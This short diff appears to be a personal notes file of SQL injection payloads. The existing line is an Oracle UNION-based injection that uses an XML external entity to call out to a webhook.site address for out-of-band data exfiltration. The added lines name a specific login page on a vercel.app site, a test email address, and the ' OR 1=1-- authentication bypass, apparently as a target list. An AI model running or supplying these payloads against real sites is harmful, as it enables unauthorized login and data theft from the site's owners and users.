@@ -1,1 +1,6 @@
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://webhook.site/399ae2f3-a94a-4c94-8507-d2e2ed0f4c7a"> %remote;]>'),'/l') FROM dual--
+
+
+https://tmsmindx.vercel.app/login
+test@mindx.net.vn
+' OR 1=1--
